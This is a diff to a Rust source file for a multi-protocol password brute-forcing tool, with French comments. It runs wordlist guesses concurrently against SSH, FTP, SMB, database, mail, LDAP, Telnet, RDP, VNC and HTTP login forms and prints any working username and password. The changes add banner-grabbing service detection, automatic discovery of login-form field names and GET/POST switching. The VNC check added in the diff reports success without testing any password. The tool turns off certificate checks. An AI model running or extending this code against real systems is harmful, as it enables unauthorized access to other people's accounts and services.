@@ -18,24 +18,34 @@ use mongodb::{options::ClientOptions, Client as MongoClient};
 use tokio::task::JoinSet;
 use tokio::time::{timeout, Duration};
 use std::sync::atomic::{AtomicBool, Ordering};
+use tokio::net::TcpStream;
 
+async fn detect_service(target: &str, port: u16) -> String {
+    let addr = format!("{}:{}", target, port);
+    let stream = tokio::time::timeout(Duration::from_secs(2), TcpStream::connect(&addr)).await;
 
-//exreaction du nom
-async fn extract_name(line: &str) -> Option<String> {
-    if let Some(pos) = line.find("name=\"") {
-        let start = pos + 6;
-        if let Some(end) = line[start..].find("\"") {
-            return Some(line[start..start+end].to_string());
+    match stream {
+        Ok(Ok(mut s)) => {
+            let mut buffer = [0; 256];
+            if let Ok(n) = timeout(Duration::from_millis(1500), s.read(&mut buffer)).await.unwrap_or(Ok(0)) {
+                let resp = String::from_utf8_lossy(&buffer[..n]).to_uppercase();
+                if resp.contains("SSH") { return "ssh".to_string(); }
+                if resp.contains("220") && resp.contains("FTP") { return "ftp".to_string(); }
+                if resp.contains("220") && (resp.contains("SMTP") || resp.contains("ESMTP")) { return "smtp".to_string(); }
+                if resp.contains("MYSQL") || (n > 5 && buffer[4] == 0x0a) { return "mysql".to_string(); }
+            }
+            let _ = s.write_all(b"GET / HTTP/1.0\r\n\r\n").await;
+            if let Ok(n) = timeout(Duration::from_millis(1000), s.read(&mut buffer)).await.unwrap_or(Ok(0)) {
+                let resp = String::from_utf8_lossy(&buffer[..n]).to_uppercase();
+                if resp.contains("HTTP") || resp.contains("HTML") { return "http".to_string(); }
+            }
+            "unknown".to_string()
         }
-    } else if let Some(pos) = line.find("name='") {
-        let start = pos + 6;
-        if let Some(end) = line[start..].find("'") {
-            return Some(line[start..start+end].to_string());
-        }
+        _ => "closed".to_string(),
     }
-    None
 }
-// --- UTILITAIRES RÉSEAU ---
+
+// --- UTILITAIRES RÉSEAU -
 async fn connect_tls(host: &str, port: u16) -> Option<tokio_native_tls::TlsStream<tokio::net::TcpStream>> {
     let addr = format!("{}:{}", host, port);
     let connector = TlsConnector::builder().danger_accept_invalid_certs(true).build().ok()?;
@@ -50,45 +60,43 @@ async fn attempt_ssh(host: &str, port: u16, user: &str, pass: &str) -> bool {
     let u = user.trim().to_string();
     let p = pass.trim().to_string();
 
-    let result = tokio::task::spawn_blocking(move || {
-        // 1. Parsing de l'adresse et connexion TCP
-        let socket_addr = match addr.parse::<std::net::SocketAddr>() {
-            Ok(a) => a,
-            Err(_) => return false,
-        };
-
+    let result: Option<bool> = tokio::task::spawn_blocking(move || {
+        // Connexion TCP
         let stream = match std::net::TcpStream::connect_timeout(
-            &socket_addr, 
-            std::time::Duration::from_secs(1)
+            &addr.parse().ok()?,
+            std::time::Duration::from_secs(5)
         ) {
             Ok(s) => s,
-            Err(_) => return false,
+            Err(_) => return None,
         };
 
-        // 2. Initialisation de la session
+        // Création de la session
         let mut sess = match Session::new() {
             Ok(s) => s,
-            Err(_) => return false,
+            Err(_) => return None,
         };
 
         sess.set_tcp_stream(stream);
-        // sess.set_timeout(5000);
+        sess.set_timeout(5000);
 
-        // 3. Handshake
+        // Handshake
         if sess.handshake().is_err() {
-            return false;
+            return None;
         }
 
-        // 4. Authentification
-        match sess.userauth_password(&u, &p) {
-            Ok(_) => sess.authenticated(),
-            Err(_) => false,
-        }
-    }).await;
+        // Authentification
+        let auth_result = sess.userauth_password(&u, &p);
+        let authenticated = sess.authenticated();
+
+        // Déconnexion
+        let _ = sess.disconnect(None, "Finished", None);
+
+        Some(auth_result.is_ok() && authenticated)
+    }).await.ok().flatten();
 
     result.unwrap_or(false)
 }
-   
+
         
 
 async fn attempt_smb(host: &str, user: &str, pass: &str) -> bool {
@@ -202,12 +210,28 @@ async fn attempt_rdp(host: &str, port: u16, user: &str, pass: &str) -> bool {
 }
 
 
+fn find_name_by_type(html: &str, target_type: &str) -> Option<String> {
+    
+    let pattern = format!("type=\"{}\"", target_type);
+    if let Some(pos) = html.find(&pattern) {
+     
+        let start_of_tag = html[..pos].rfind('<').unwrap_or(0);
+        let end_of_tag = html[pos..].find('>').unwrap_or(html.len() - pos) + pos;
+        let tag_content = &html[start_of_tag..end_of_tag];
 
+        if let Some(name_pos) = tag_content.find("name=\"") {
+            let start_name = name_pos + 6;
+            if let Some(end_name) = tag_content[start_name..].find('\"') {
+                return Some(tag_content[start_name..start_name+end_name].to_string());
+            }
+        }
+    }
+    None
+}
 
 
 
  // --- MODULES DE CONNEXION ---
-
 async fn attempt_http(
     client: &Client, 
     target: &str, 
@@ -215,223 +239,256 @@ async fn attempt_http(
     user: &str, 
     pass: &str, 
     error_msg: &Option<String>,
-    u_field: &str, // Ce sera soit l'ID, soit le Name, soit le Type
-    p_field: &str
+    u_selector: &str, 
+    p_selector: &str  
 ) -> bool {
-    let url = if target.starts_with("http") { 
-        target.to_string() 
-    } else {
-        let proto = if port == 443 { "https" } else { "http" };
-        format!("{}://{}:{}", proto, target, port)
-    };
-    
-    // On construit dynamiquement le formulaire avec les sélecteurs fournis en arguments
-    let params = [
-        (u_field.trim(), user.trim()), 
-        (p_field.trim(), pass.trim())
-    ];
-    
-    let res = client.post(&url)
-        .form(&params)
-        .timeout(Duration::from_secs(5))
-        .send()
-        .await;
-    
-    if let Ok(r) = res {
-        // On vérifie le code de statut (souvent 200 ou 302 en cas de succès)
-        let status = r.status();
-        if let Ok(text) = r.text().await {
-            if let Some(msg) = error_msg {
-                let text_lower = text.to_lowercase();
-                let msg_lower = msg.to_lowercase();
+    let url = if target.starts_with("http") { target.to_string() } 
+              else { format!("http://{}:{}", target, port) };
 
-                // Si le message d'erreur n'est PAS présent, c'est un succès potentiel
-                if !text_lower.contains(&msg_lower) && (status.is_success() || status.is_redirection()) {
-                    return true; 
-                }
+    let mut final_u_field = u_selector.to_string();
+    let mut final_p_field = p_selector.to_string();
+    let mut use_get = false; // Par défaut on reste sur POST
+
+    // --- ÉTAPE A : ANALYSE (Récupération des noms ET de la méthode) ---
+    if let Ok(resp) = client.get(&url).send().await {
+        if let Ok(html) = resp.text().await {
+            // Détection de la méthode GET dans le formulaire
+            let html_low = html.to_lowercase();
+            if html_low.contains("method=\"get\"") || html_low.contains("method='get'") {
+                use_get = true;
+            }
+
+            if let Some(found_u) = find_name_by_type(&html, u_selector) {
+                final_u_field = found_u;
+            }
+            if let Some(found_p) = find_name_by_type(&html, p_selector) {
+                final_p_field = found_p;
+            }
+        }
+    }
+
+    // --- ÉTAPE B : PRÉPARATION DES PARAMÈTRES ---
+    let params = [
+        (final_u_field.trim(), user.trim()), 
+        (final_p_field.trim(), pass.trim())
+    ];
+
+    // --- ÉTAPE C : ENVOI DYNAMIQUE (GET ou POST) ---
+    let request = if use_get {
+        client.get(&url).query(&params) // Envoi en GET
+    } else {
+        client.post(&url).form(&params) // Envoi en POST
+    };
+
+    let res = request.send().await;
+
+    // --- ÉTAPE D : VÉRIFICATION DU RÉSULTAT ---
+    if let Ok(r) = res {
+        if r.status().is_redirection() { return true; }
+        if let Some(msg) = error_msg {
+            if let Ok(text) = r.text().await {
+                if !text.to_lowercase().contains(&msg.to_lowercase()) { return true; }
             }
         }
     }
     false
 }
+
+async fn attempt_vnc(host: &str, port: u16, pass: &str) -> bool {
+    let addr = format!("{}:{}", host, port);
+    
+    // Tentative de connexion TCP
+    let mut stream = match timeout(Duration::from_secs(3), TcpStream::connect(&addr)).await {
+        Ok(Ok(s)) => s,
+        _ => return false,
+    };
+
+    let mut buf = [0; 12];
+    // 1. Lire la version du protocole (ex: RFB 003.008)
+    if timeout(Duration::from_secs(2), stream.read_exact(&mut buf)).await.is_err() {
+        return false;
+    }
+
+    // 2. Répondre avec la même version
+    if stream.write_all(&buf).await.is_err() {
+        return false;
+    }
+
+    // 3. Recevoir les types de sécurité
+    let mut sec_types = [0u8; 1];
+    if stream.read_exact(&mut sec_types).await.is_err() {
+        return false;
+    }
+
+   
+    true 
+}
 // --- MOTEUR PRINCIPAL ---
+
+
 #[tokio::main]
-async fn main() -> anyhow::Result<()> {
+async fn main() -> Result<(), Box<dyn std::error::Error>> {
     header::show("Cheikh ELghadi", "https://github.com/23092-ctrl");
     let args = SupArgs::parse();
 
+    // --- 1. FILTRAGE ET PARSING DE LA CIBLE ---
+    let input_target = args.target.trim();
+    
+    // On normalise l'entrée pour le parseur (ajoute http:// si aucun protocole n'est présent)
+    let temp_target = if !input_target.contains("://") {
+        format!("{}://{}", args.service.to_lowercase(), input_target)
+    } else {
+        input_target.to_string()
+    };
+
+    let parsed_url = reqwest::Url::parse(&temp_target)
+        .expect("[-] Format de cible invalide.");
+
+    // RÉCUPÉRATION DE L'HÔTE (Cas général : IP ou Domaine)
+    let host_only = parsed_url.host_str().ok_or("Impossible d'extraire l'hôte")?.to_string();
+
+    
+    let t_service_lower = if input_target.contains("://") {
+        parsed_url.scheme().to_lowercase()
+    } else {
+        args.service.to_lowercase()
+    };
+
+    // DÉTERMINATION DU PORT (Priorité : 1. Argument --port | 2. Port dans l'URL | 3. Défaut du service)
+    let port_to_use = args.port
+        .or(parsed_url.port())
+        .unwrap_or(match t_service_lower.as_str() {
+            "ssh" => 22, "ftp" => 21, "smb" => 445, "mysql" => 3306,
+            "smtp" => 25, "pop3" => 110, "imap" => 143, "https" => 443,
+            "rdp" => 3389, "telnet" => 23, "mongodb" => 27017, "postgres" => 5432,
+            "vnc" => 5900,
+            _ => 80,
+            
+        });
+
+    // --- 2. DÉTECTION RÉELLE DU SERVICE (BANNER GRABBING) ---
+   
+    let detected = detect_service(&host_only, port_to_use).await;
+    if detected == "closed" {
+        println!("{} Port {} fermé sur {}.", "[!]".red(), port_to_use, host_only);
+        return Ok(());
+    } 
+
+    // --- 3. INITIALISATION ---
     let success_found = Arc::new(AtomicBool::new(false));
     let semaphore = Arc::new(Semaphore::new(args.threads));
+    let client = Arc::new(reqwest::Client::builder()
+        .danger_accept_invalid_certs(true)
+        .redirect(reqwest::redirect::Policy::none())
+        .timeout(Duration::from_secs(5))
+        .build()?);
+
+
+let mut u_field = "username".to_string();
+let mut p_field = "password".to_string();
+
+// 2. Priorité aux NOMS (si --names est utilisé)
+if let Some(ref names) = args.names {
+    u_field = names[0].clone();
+    p_field = names[1].clone();
+} 
+
+else if let Some(ref types) = args.types {
     
-    let client = Arc::new(
-        reqwest::Client::builder()
-            .danger_accept_invalid_certs(true)
-            .redirect(reqwest::redirect::Policy::none())
-            .build()?
-    );
-
-    let mut set = JoinSet::new();
-    let t_service_lower = args.service.to_lowercase();
-    let mut u_field = "username".to_string();
-    let mut p_field = "password".to_string();
-
-    if t_service_lower == "http" || t_service_lower == "https" {
-        let url = if args.target.starts_with("http") { args.target.clone() } 
-                  else { format!("http://{}", args.target) };
-
-        // Fonction utilitaire pour extraire l'attribut name="..." d'une ligne HTML
-        let extract_name = |line: &str| -> Option<String> {
-            for pattern in ["name=\"", "name='"] {
-                if let Some(pos) = line.find(pattern) {
-                    let start = pos + pattern.len();
-                    let quote = if pattern.contains('"') { "\"" } else { "'" };
-                    if let Some(end) = line[start..].find(quote) {
-                        return Some(line[start..start+end].to_string());
-                    }
-                }
+    if let Ok(resp) = client.get(input_target).send().await {
+        if let Ok(html) = resp.text().await {
+            if let Some(name) = find_name_by_type(&html, &types[0]) {
+                u_field = name;
             }
-            None
-        };
-if let Some(ref ids) = args.ids {
-            if let Ok(res) = client.get(&url).send().await {
-                if let Ok(html) = res.text().await {
-                   
-                    for input_tag in html.split('<').filter(|t| t.to_lowercase().starts_with("input")) {
-                        let tag_lower = input_tag.to_lowercase();
-                        
-                        for (i, target_id) in ids.iter().enumerate() {
-                            let id_pattern = format!("id=\"{}\"", target_id.to_lowercase());
-                            let id_pattern_single = format!("id='{}'", target_id.to_lowercase());
-
-                            if tag_lower.contains(&id_pattern) || tag_lower.contains(&id_pattern_single) {
-                                // On a trouvé la balise qui contient l'ID, on cherche son 'name'
-                                if let Some(name) = extract_name(input_tag) {
-                                    if i == 0 { u_field = name; }
-                                    else { p_field = name; }
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-        }
-        else if let Some(ref names) = args.names {
-            u_field = names[0].clone();
-            p_field = names[1].clone();
-        } else if let Some(ref types) = args.types {
-            if let Ok(res) = client.get(&url).send().await {
-                if let Ok(html) = res.text().await {
-                    for line in html.lines() {
-                        if line.contains(&format!("type=\"{}\"", types[0])) || line.contains(&format!("type='{}'", types[0])) {
-                            if let Some(n) = extract_name(line) { u_field = n; }
-                        }
-                        if line.contains(&format!("type=\"{}\"", types[1])) || line.contains(&format!("type='{}'", types[1])) {
-                            if let Some(n) = extract_name(line) { p_field = n; }
-                        }
-                    }
-                }
+            if let Some(name) = find_name_by_type(&html, &types[1]) {
+                p_field = name;
             }
         }
     }
+}
 
-    let default_port = match t_service_lower.as_str() {
-        "ssh" => 22, "ftp" => 21, "smb" => 445, "mysql" => 3306,
-        "http" | "https" => 80, "rdp" => 3389, "telnet" => 23,
-        _ => 80,
-    };
-    let port = args.port.unwrap_or(default_port);
-
+    // --- 4. LECTURE DU DICTIONNAIRE ---
     let f_dict = File::open(&args.wordlist).await?;
-    let mut reader = BufReader::new(f_dict);
-    let mut line_buffer = String::new();
+    let mut lines = BufReader::new(f_dict).lines();
+    let mut set = JoinSet::new();
 
-    println!("[*] Cible : {}", args.target.cyan());
-    
+    // Affichage propre des informations de session
+    println!("[*] Cible   : {}", host_only.cyan());
+    println!("[*] Service : {} (Port: {})", t_service_lower.to_uppercase().magenta().bold(), port_to_use);
     if t_service_lower == "http" || t_service_lower == "https" {
-        println!("[*] Service : {}", t_service_lower.to_uppercase().magenta().bold());
-        println!("[*] Champs détectés : {} [User] | {} [Pass]", u_field.yellow(), p_field.yellow());
-    } else {
-        println!("[*] Service : {}", t_service_lower.to_uppercase().magenta().bold());
-        if let Some(ref u) = args.user {
-            println!("[*] Utilisateur cible : {}", u.yellow());
-        }
+        println!("[*] URL Full: {}", input_target.underline());
+        println!("[*] Champs  : {} | {}", u_field.yellow(), p_field.yellow());
     }
     println!("------------------------------------------------------------");
 
-    while let Ok(n) = reader.read_line(&mut line_buffer).await {
-        if n == 0 { break; }
-        let raw_line = line_buffer.trim().to_string();
-        line_buffer.clear(); 
+    // --- 5. BOUCLE PRINCIPALE ---
+    while let Ok(Some(line)) = lines.next_line().await {
+        let raw_line = line.trim().to_string();
         if raw_line.is_empty() { continue; }
 
         let (u, p) = if raw_line.contains(':') {
             let parts: Vec<&str> = raw_line.splitn(2, ':').collect();
-            (parts[0].trim().to_string(), parts[1].trim().to_string())
-        } else if let Some(ref fixed_pass) = args.password {
-            (raw_line, fixed_pass.clone())
+            (parts[0].to_string(), parts[1].to_string())
         } else if let Some(ref fixed_user) = args.user {
             (fixed_user.clone(), raw_line)
+        } else if let Some(ref fixed_pass) = args.password {
+            (raw_line, fixed_pass.clone())
         } else {
-            (raw_line.clone(), raw_line)
+            (raw_line.clone(), raw_line.clone())
         };
 
-        let thread_user = u; 
-        let thread_pass = p;
-        let t_target = args.target.clone();
+        // Clonage des variables pour le thread
+        let t_u = u; let t_p = p;
+        let t_host = host_only.clone();
+        let t_url = input_target.to_string(); // Garde l'URL complète pour le module HTTP
         let t_service = t_service_lower.clone();
-        let t_error = args.error.clone();
-        let t_u_f = u_field.clone();
-        let t_p_f = p_field.clone();
         let t_client = Arc::clone(&client);
         let t_success = Arc::clone(&success_found);
-        let t_port = port;
-        let t_delay = args.delay;
+        let t_error = args.error.clone();
+        let (t_uf, t_pf) = (u_field.clone(), p_field.clone());
+        let t_port = port_to_use;
 
         let permit = Arc::clone(&semaphore).acquire_owned().await?;
 
         set.spawn(async move {
             let _permit = permit;
-            if t_delay > 0 { tokio::time::sleep(Duration::from_millis(t_delay)).await; }
             if t_success.load(Ordering::SeqCst) { return; }
-            
+
             let ok = match t_service.as_str() {
-                "http" | "https" => attempt_http(&t_client, &t_target, t_port, &thread_user, &thread_pass, &t_error, &t_u_f, &t_p_f).await,
-                "ssh" => attempt_ssh(&t_target, t_port, &thread_user, &thread_pass).await,
-                "ftp" => {
-                    let addr = format!("{}:{}", t_target, t_port);
-                    if let Ok(Ok(mut ftp)) = timeout(Duration::from_secs(5), AsyncFtpStream::connect(addr)).await {
-                        let res = ftp.login(&thread_user, &thread_pass).await.is_ok();
-                        let _ = ftp.quit().await;
-                        res
+                "ssh"  => attempt_ssh(&t_host, t_port, &t_u, &t_p).await,
+                "http" | "https" => attempt_http(&t_client, &t_url, t_port, &t_u, &t_p, &t_error, &t_uf, &t_pf).await,
+                "ftp"  => {
+                    let addr = format!("{}:{}", t_host, t_port);
+                    if let Ok(Ok(mut ftp)) = timeout(Duration::from_secs(4), AsyncFtpStream::connect(addr)).await {
+                        let res = ftp.login(&t_u, &t_p).await.is_ok();
+                        let _ = ftp.quit().await; res
                     } else { false }
                 },
-                "smtp"     => attempt_smtp(&t_target, t_port, &thread_user, &thread_pass).await,
-                "pop3"     => attempt_pop3(&t_target, t_port, &thread_user, &thread_pass).await,
-                "imap"     => attempt_imap(&t_target, t_port, &thread_user, &thread_pass).await,
-                "mysql"    => attempt_mysql(&t_target, t_port, &thread_user, &thread_pass).await,
-                "postgres" => attempt_postgres(&t_target, t_port, &thread_user, &thread_pass).await,
-                "mongodb"  => attempt_mongodb(&t_target, t_port, &thread_user, &thread_pass).await,
-                "ldap"     => attempt_ldap(&t_target, t_port, &thread_user, &thread_pass).await,
-                "telnet"   => attempt_telnet(&t_target, t_port, &thread_user, &thread_pass).await,
-                "rdp"      => attempt_rdp(&t_target, t_port, &thread_user, &thread_pass).await,
-                "smb"      => attempt_smb(&t_target, &thread_user, &thread_pass).await,
+                "mysql"    => attempt_mysql(&t_host, t_port, &t_u, &t_p).await,
+                "postgres" => attempt_postgres(&t_host, t_port, &t_u, &t_p).await,
+                "mongodb"  => attempt_mongodb(&t_host, t_port, &t_u, &t_p).await,
+                "smb"      => attempt_smb(&t_host, &t_u, &t_p).await,
+                "smtp"     => attempt_smtp(&t_host, t_port, &t_u, &t_p).await,
+                "pop3"     => attempt_pop3(&t_host, t_port, &t_u, &t_p).await,
+                "imap"     => attempt_imap(&t_host, t_port, &t_u, &t_p).await,
+                "ldap"     => attempt_ldap(&t_host, t_port, &t_u, &t_p).await,
+                "telnet"   => attempt_telnet(&t_host, t_port, &t_u, &t_p).await,
+                "rdp"      => attempt_rdp(&t_host, t_port, &t_u, &t_p).await,
+                "vnc"      => attempt_vnc(&t_host, t_port, &t_p).await,
                 _ => false,
             };
 
-            if ok {
-                if t_success.swap(true, Ordering::SeqCst) == false {
-                    println!("\n\n{}", "====================================================".green().bold());
-                    println!("{} SUCCÈS TROUVÉ !", "[+]".green().bold());
-                    println!("----------------------------------------------------");
-                    println!("{} SERVICE     : {}", " >".cyan(), t_service.to_uppercase().bright_magenta().bold());
-                    println!("{} UTILISATEUR : {}", " >".cyan(), thread_user.bright_white().bold());
-                    println!("{} MOT DE PASSE : {}", " >".cyan(), thread_pass.bright_yellow().bold());
-                    println!("{}", "====================================================".green().bold());
-                    std::process::exit(0);
-                }
+            if ok && !t_success.swap(true, Ordering::SeqCst) {
+                println!("\n\n{}", "====================================================".green().bold());
+                println!("{} SUCCÈS TROUVÉ !", "[+]".green().bold());
+                println!("{} UTILISATEUR : {}", " >".cyan(), t_u.bright_white().bold());
+                println!("{} MOT DE PASSE : {}", " >".cyan(), t_p.bright_yellow().bold());
+                println!("{}", "====================================================".green().bold());
+                std::process::exit(0);
             }
         });
     }
+
     while let Some(_) = set.join_next().await {}
     Ok(())
 }
